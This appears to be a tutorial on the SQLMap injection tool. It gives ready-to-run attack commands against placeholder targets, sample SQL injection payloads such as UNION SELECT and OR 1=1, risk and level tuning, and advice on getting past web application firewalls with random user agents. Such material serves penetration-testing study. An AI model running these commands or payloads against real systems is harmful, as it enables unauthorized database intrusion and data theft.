# Running on HTTP Requests

Common mistakes that break SQLMap: wrong cookies, messy command, bad POST data format. This section is about getting the request right.

## Easiest Method – Copy as cURL from Browser

1. Open DevTools → Network tab
2. Find the request you want to test
3. Right-click → **Copy as cURL**
4. Paste it in terminal, replace `curl` with `sqlmap`

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Accept: image/webp,*/*' \
  -H 'Connection: keep-alive'
```

SQLMap needs at least one injectable parameter or use `--crawl` / `--forms` / `-g` for auto-discovery.

## GET Requests

```bash
sqlmap -u 'http://www.example.com/page.php?id=1'
```

## POST Requests

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

Both `uid` and `name` get tested. To target a specific one:

```bash
# Option 1: use -p
sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid

# Option 2: mark it with *
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Full HTTP Request from Burp (-r flag)

Best for complex requests with custom headers, cookies, long POST body.

**In Burp:** right-click request → Copy to file (or Copy → Copy Request Headers, paste to file)

Example `req.txt`:

```
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 ...
Accept: text/html,...
Cookie: PHPSESSID=abc123
Connection: close
```

Run it:

```bash
sqlmap -r req.txt
```

To specify injection point inside the file:

```
GET /?id=1* HTTP/1.1
```

## Custom Request Options

```bash
# Set cookie
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Same thing via -H
sqlmap ... -H='Cookie: PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

# Other headers
--host, --referer, -A/--user-agent

# Randomize User-Agent (important for WAF bypass)
sqlmap ... --random-agent

# Imitate mobile browser
sqlmap ... --mobile

# Custom HTTP method
sqlmap -u www.target.com --data='id=1' --method PUT
```

> SQLMap's default User-Agent string (`sqlmap/1.4.9...`) is recognizable and many WAFs/firewalls block it outright. Always use `--random-agent` in real tests.

## Injecting into Headers

SQLMap only tests HTTP parameters by default. To test a header value, add `*` after it:

```bash
sqlmap ... --cookie="id=1*"
```

Works on any part of the request.

## JSON and XML POST Bodies

SQLMap handles JSON and XML in a relaxed way — no strict format requirements.

Short body → use `--data`:

```bash
sqlmap ... --data='{"id": 1}'
```

Complex/long body → save to file and use `-r`:

```
# req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    ...
  }]
}
```

```bash
sqlmap -r req.txt
# SQLMap will detect JSON automatically and ask to process it
```

# Handling Errors

When something's not working, there are four main ways to debug it.

## 1. Display DBMS Errors – `--parse-errors`

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --parse-errors
```

Prints DBMS error messages directly in the output. Useful when the target is returning SQL errors but SQLMap isn't showing them by default.

Example output:

```
[WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or 
access violation: 1064 You have an error in your SQL syntax...'
```

This tells you exactly what the DB is complaining about, which helps you figure out why injection isn't working.

## 2. Store All Traffic – `-t`

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
cat /tmp/traffic.txt
```

Dumps every HTTP request and response to a file. Good when you need to manually inspect what SQLMap is actually sending and what the server is replying with.

Output format:

```
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
...

HTTP response [#1] (200 OK):
...
```

## 3. Verbose Output – `-v`

```bash
sqlmap -u "http://target.com/vuln.php?id=1" -v 6 --batch
```

Verbosity levels 0–6. Level 6 is max — shows DEBUG messages, every request sent (`TRAFFIC OUT`), and every response received (`TRAFFIC IN`) live in the terminal.

Use this when you want to watch exactly what's happening in real time instead of digging through a file.

## 4. Route Through Burp – `--proxy`

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

Sends all SQLMap traffic through Burp (or any MiTM proxy). From there you can:

- See every request in HTTP history
- Replay individual requests
- Modify and tamper manually
- Use Burp's full toolset on SQLMap's payloads

Good for deep inspection or when you want to understand what specific payloads look like before/after WAF filtering.

# Attack Tuning

SQLMap works fine out of the box most of the time, but sometimes you need to nudge it in the right direction.

## How Payloads Are Built

Every payload = **vector** + **boundaries**

- **Vector** – the actual SQL code (e.g. `UNION ALL SELECT 1,2,VERSION()`)
- **Boundaries** – prefix/suffix wrapping the vector to fit into the vulnerable query (e.g. `'<vector>-- -`)

## Custom Prefix/Suffix

When the injection point has unusual quoting or wrapping that SQLMap doesn't cover automatically:

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Example: if the PHP code wraps the input like `WHERE id LIKE (('input'))`, then the default boundaries won't close properly. Setting prefix/suffix manually makes the final SQL valid:

```sql
SELECT ... WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

## Level & Risk

These are the main tuning knobs. Don't touch them unless needed — they slow things down a lot.

```bash
sqlmap -u "target.com/?id=1" --level=5 --risk=3
```

**`--level` (1–5, default 1)** Extends the number of boundaries (prefix/suffix combos) tested. Higher level = more obscure/unlikely boundaries get tested too.

**`--risk` (1–3, default 1)** Extends the vector set based on how dangerous the payload is to the target. Higher risk = includes OR-based payloads and others that could cause data loss or trigger DELETE/UPDATE.

|Setting|Payloads per parameter|
|---|---|
|Default (level=1, risk=1)|~72|
|Max (level=5, risk=3)|~7,865|

Login pages often need OR payloads to work (e.g. `OR 1=1`). But OR payloads are risky by default because they can affect UPDATE/DELETE statements — that's why they're off unless you explicitly raise risk.

To see what payloads are being used, combine with `-v 3`:

```bash
sqlmap -u "target.com/?id=1" -v 3 --level=5
```

## Advanced Detection Tuning

For when the default comparison logic isn't picking up on TRUE vs FALSE differences.

**By HTTP status code:**

```bash
--code=200
# TRUE = 200, FALSE = anything else
```

**By page title:**

```bash
--titles
# Compares <title> tag content between responses
```

**By specific string:**

```bash
--string=success
# TRUE response contains "success", FALSE doesn't
```

**Text only (strip HTML noise):**

```bash
--text-only
# Ignores <script>, <style>, <meta> etc. Compares only visible text
```

## Limit Injection Techniques

Skip slow/problematic types:

```bash
--technique=BEU
# Only test: Boolean-based blind, Error-based, UNION-query
# Skips time-based (T) and stacked queries (S)
```

Useful when time-based payloads are causing timeouts or false results.

## UNION SQLi Tuning

When UNION-based injection needs extra info to work:

```bash
# Specify exact column count manually
--union-cols=17

# Change the default filler value (NULL / random int)
--union-char='a'

# Add FROM <table> at end (required for Oracle)
--union-from=users
```

If SQLMap can't detect the DBMS early, it might miss the required `FROM` clause — set it manually in that case.
